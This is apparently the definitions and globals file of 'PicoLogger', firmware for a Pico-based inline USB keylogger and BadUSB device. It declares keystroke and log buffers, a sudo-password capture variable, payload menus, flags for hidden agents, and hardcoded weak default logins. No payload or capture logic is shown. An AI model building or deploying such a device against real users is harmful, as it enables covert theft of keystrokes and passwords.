// ======================================= Define and Variables =============================================

#define HOST_PIN_DP   19
#define BUFFER_SIZE 64
#define INACTIVITY_TIMEOUT_MS 2000
#define MODIFIERKEY_LEFT_CTRL   (0x01)
#define MODIFIERKEY_LEFT_SHIFT  (0x02)
#define MODIFIERKEY_LEFT_ALT    (0x04)
#define MODIFIERKEY_LEFT_GUI    (0x08)
#define MODIFIERKEY_RIGHT_CTRL  (0x10)
#define MODIFIERKEY_RIGHT_SHIFT (0x20)
#define MODIFIERKEY_RIGHT_ALT   (0x40)
#define MODIFIERKEY_RIGHT_GUI   (0x80)
//#define SHIFT   (0x80)
#define ALTGR   (0x40)
#define I2C_ADDRESS 0x3C
#define OLED_WIDTH  128
#define OLED_HEIGHT 32
Adafruit_USBD_MSC usb_msc;

Adafruit_SSD1306 display(OLED_WIDTH, OLED_HEIGHT, &Wire);
WebServer server(80);
extern const uint8_t _asciimap[] PROGMEM;
Adafruit_USBH_Host USBHost;
tusb_desc_device_t desc_device;

String validUser = "admin";
String validPass = "password";

bool isLoggedIn = false;
bool isScrolling = false;
bool lastPrintWasRoute = false;
bool hasClearedStartup = false;
char keyBuffer[BUFFER_SIZE];
static uint8_t mod = 0;
uint8_t modifiersard=0;
uint8_t key;
uint8_t tmp_key;
int key_layout;
int key_modifier_layout;
uint8_t c = 0;
uint8_t bufferIndex = 0;
unsigned long lastKeyTime = 0;
uint8_t const desc_hid_report_reflection[] = { TUD_HID_REPORT_DESC_KEYBOARD(HID_REPORT_ID(1)) };
String ssid = "PicoLogger";  // Default SSID
String password = "12345678"; // Default Password

#define NAV_UP_PIN     6
#define NAV_DOWN_PIN   7 
#define NAV_LEFT_PIN   8
#define NAV_RIGHT_PIN  9 
#define NAV_SELECT_PIN 10

const uint16_t DEBOUNCE_DELAY = 100;

uint32_t lastDebounceTimeUp    = 0;
uint32_t lastDebounceTimeDown  = 0;
uint32_t lastDebounceTimeLeft  = 0;
uint32_t lastDebounceTimeSelect= 0;

bool lastUpState    = HIGH;
bool lastDownState  = HIGH;
bool lastLeftState  = HIGH;
bool lastSelectState= HIGH;

void setupNavigationPins() {
  pinMode(NAV_UP_PIN,     INPUT_PULLUP);
  pinMode(NAV_DOWN_PIN,   INPUT_PULLUP);
  pinMode(NAV_LEFT_PIN,   INPUT_PULLUP);
  pinMode(NAV_RIGHT_PIN,  INPUT_PULLUP);
  pinMode(NAV_SELECT_PIN, INPUT_PULLUP);
}

bool simplePress(uint8_t pin) {
  if (digitalRead(pin) == LOW) {
    delay(50);
    while (digitalRead(pin) == LOW) {}
    return true;
  }
  return false;
}

bool invertedState = false;
String layout = "us";

bool upPressed()       { return simplePress(invertedState ? NAV_DOWN_PIN : NAV_UP_PIN); }
bool downPressed()     { return simplePress(invertedState ? NAV_UP_PIN : NAV_DOWN_PIN); }
bool selectPressed()   { return simplePress(NAV_SELECT_PIN); }
bool backPressed()     { return simplePress(invertedState ? NAV_RIGHT_PIN : NAV_LEFT_PIN); }
bool forwardPressed()  { return simplePress(invertedState ? NAV_LEFT_PIN : NAV_RIGHT_PIN); }

extern void moveSelectionUp();
extern void moveSelectionDown();
extern void selectItem();
extern void backToMainMenu();
extern void runPayloadHandler();
extern void deletePayloadHandler();
extern void drawMenu();
extern void restartPico();
extern void printout(const char *str);
extern void showWaitScreen(String msg);
extern void handleExplorerAgent();
extern void buildPassManagerMenu();



struct MenuItem {
  const char* name;
  void (*handler)();
  MenuItem* submenu;
  uint8_t submenuLength;
};

String*          badUsbFiles       = nullptr;
uint8_t          badUsbFilesCount  = 0;
MenuItem*        badUsbMenu        = nullptr;
uint8_t          badUsbMenuLength  = 0;
MenuItem*        payloadActionMenu = nullptr;
String           currentPayload;
String           currentPassTitle = "";

#define MAX_LOG_LINES 512

String logLines[MAX_LOG_LINES];
uint16_t totalLogLines = 0;
int16_t currentLogIndex = 0;

bool liveCaptureStart = true;
bool liveCaptureActive = false;

bool showBootMessage = false;
String bootMessage = "";
uint32_t bootMessageMillis = 0;

bool showWifiMessage = false;
bool fromMenu = false;
bool psAgentAdminFlag = false;
bool psAgentHiddenFlag = false;
bool ssAgentHiddenFlag = false;
bool linuxAgentHiddenFlag = false;
bool wifiState = true;

bool passwordExpected = false;
bool commandDetected = false;
bool passwordWaiting = true;
String sudoPassword = "";


const unsigned char picoLoggerLogo [] PROGMEM = {
0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x3c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x7c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x7c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x01, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x03, 0x01, 0x00, 0x1f, 0xcc, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x07, 0x01, 0xc0, 0x18, 0xec, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x0f, 0x83, 0xe0, 0x18, 0x60, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x0f, 0x80, 0xc0, 0x18, 0x6c, 0x3c, 0x3e, 0x18, 0x07, 0xc1, 0xec, 0x7b, 0x0f, 0x8d, 0xc0, 
0x00, 0x0f, 0x80, 0x40, 0x18, 0x6c, 0x66, 0x73, 0x18, 0x0e, 0x63, 0x9c, 0xe7, 0x19, 0x8f, 0x00, 
0x00, 0x1f, 0xc0, 0x40, 0x18, 0xec, 0xc0, 0x61, 0x98, 0x0c, 0x33, 0x0c, 0xc3, 0x30, 0xce, 0x00, 
0x00, 0x1f, 0xe0, 0x40, 0x1f, 0xcc, 0xc0, 0x61, 0x98, 0x0c, 0x33, 0x0c, 0xc3, 0x30, 0xcc, 0x00, 
0x00, 0x1b, 0xe0, 0x10, 0x18, 0x0c, 0xc0, 0x61, 0x98, 0x0c, 0x33, 0x0c, 0xc3, 0x3f, 0xcc, 0x00, 
0x00, 0x1f, 0xe4, 0x90, 0x18, 0x0c, 0xc0, 0x61, 0x98, 0x0c, 0x33, 0x0c, 0xc3, 0x30, 0x0c, 0x00, 
0x00, 0x3f, 0xff, 0x10, 0x18, 0x0c, 0xc0, 0x61, 0x98, 0x0c, 0x33, 0x0c, 0xc3, 0x30, 0x0c, 0x00, 
0x00, 0x1d, 0xff, 0x18, 0x18, 0x0c, 0x66, 0x73, 0x18, 0x0e, 0x63, 0x9c, 0xe7, 0x18, 0xcc, 0x00, 
0x00, 0x2f, 0xff, 0x80, 0x18, 0x0c, 0x3c, 0x3e, 0x1f, 0xe7, 0xc1, 0xec, 0x7b, 0x0f, 0x8c, 0x00, 
0x00, 0x3b, 0xff, 0x98, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x03, 0x00, 0x00, 0x00, 
0x00, 0x1f, 0xff, 0x98, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x18, 0x46, 0x00, 0x00, 0x00, 
0x00, 0x1f, 0xff, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xf0, 0x7c, 0x00, 0x00, 0x00, 
0x00, 0x1f, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x0f, 0xff, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x07, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x07, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x03, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x01, 0xbc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
